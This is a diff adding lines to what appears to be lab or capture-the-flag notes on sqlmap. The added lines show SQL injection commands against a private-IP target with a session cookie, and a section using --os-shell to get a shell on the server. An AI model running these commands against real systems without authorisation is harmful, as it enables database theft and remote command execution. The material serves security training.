@@ -36,6 +36,8 @@ You will need to provide a cookie to the sqlmap in order for it to find vulnerab
 
 ```
 sqlmap -u "http://[target ip]/[php line from Burp GET request]" --cookie "[PHPSESSIONID...security_level=0" -p title
+# or include the parameter in your url (just copy from the url in the browser); e.g., "search" as below
+sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29"
 ```
 - `- u`: Target URL (e.g. "http://www.site.com/vuln.php?id=1")  
 - `--cookie`: HTTP Cookie header value 
@@ -81,4 +83,11 @@ Crawl is an important option which allows the SQLMap tool to crawl the website, 
 
 ```
 sqlmap -u http://192.168.202.160/ --crawl=1
+```
+
+## Exploit with `--os-shell`
+
+Just add `--os-shell` on the end of your successful search command (see above): 
+```
+sqlmap -u "http://10.129.166.104/dashboard.php?search=whatever" --cookie="PHPSESSID=gtn7bvir60u6kq78qljr4dhn29" --os-shell
 ```
